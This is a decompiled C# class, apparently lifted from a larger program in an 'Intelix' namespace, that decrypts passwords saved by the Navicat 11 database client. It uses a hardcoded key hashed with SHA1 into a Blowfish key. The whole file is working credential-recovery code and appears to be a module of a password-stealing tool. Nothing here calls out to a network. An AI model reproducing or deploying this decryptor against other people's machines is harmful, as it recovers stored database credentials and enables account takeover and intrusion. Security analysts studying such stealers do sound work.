using System;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000075 RID: 117
	public class Navicat11Cipher
	{
		// Token: 0x060001CF RID: 463 RVA: 0x00016D6C File Offset: 0x00014F6C
		protected byte[] StringToByteArray(string hex)
		{
			return (from x in Enumerable.Range(0, hex.Length)
			where x % 2 == 0
			select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray<byte>();
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x00016DD8 File Offset: 0x00014FD8
		protected void XorBytes(byte[] a, byte[] b, int len)
		{
			for (int i = 0; i < len; i++)
			{
				int num = i;
				a[num] ^= b[i];
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x00016E08 File Offset: 0x00015008
		public Navicat11Cipher()
		{
			byte[] array = new byte[]
			{
				51,
				68,
				67,
				53,
				67,
				65,
				51,
				57
			};
			using (SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider())
			{
				sha1CryptoServiceProvider.TransformFinalBlock(array, 0, array.Length);
				this.blowfishCipher = new Blowfish(sha1CryptoServiceProvider.Hash);
			}
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x00016E70 File Offset: 0x00015070
		public string DecryptString(string ciphertext)
		{
			byte[] array = this.StringToByteArray(ciphertext);
			byte[] array2 = Enumerable.Repeat<byte>(byte.MaxValue, this.blowfishCipher.BlockSize).ToArray<byte>();
			this.blowfishCipher.Encrypt(array2, Blowfish.Endian.Big);
			byte[] array3 = new byte[0];
			int num = array.Length / this.blowfishCipher.BlockSize;
			int num2 = array.Length % this.blowfishCipher.BlockSize;
			byte[] array4 = new byte[this.blowfishCipher.BlockSize];
			byte[] array5 = new byte[this.blowfishCipher.BlockSize];
			for (int i = 0; i < num; i++)
			{
				Array.Copy(array, this.blowfishCipher.BlockSize * i, array4, 0, this.blowfishCipher.BlockSize);
				Array.Copy(array4, array5, this.blowfishCipher.BlockSize);
				this.blowfishCipher.Decrypt(array4, Blowfish.Endian.Big);
				this.XorBytes(array4, array2, this.blowfishCipher.BlockSize);
				array3 = array3.Concat(array4).ToArray<byte>();
				this.XorBytes(array2, array5, this.blowfishCipher.BlockSize);
			}
			bool flag = num2 != 0;
			if (flag)
			{
				Array.Clear(array4, 0, array4.Length);
				Array.Copy(array, this.blowfishCipher.BlockSize * num, array4, 0, num2);
				this.blowfishCipher.Encrypt(array2, Blowfish.Endian.Big);
				this.XorBytes(array4, array2, this.blowfishCipher.BlockSize);
				array3 = array3.Concat(array4.Take(num2).ToArray<byte>()).ToArray<byte>();
			}
			return Encoding.UTF8.GetString(array3);
		}

		// Token: 0x04000064 RID: 100
		private Blowfish blowfishCipher;
	}
}
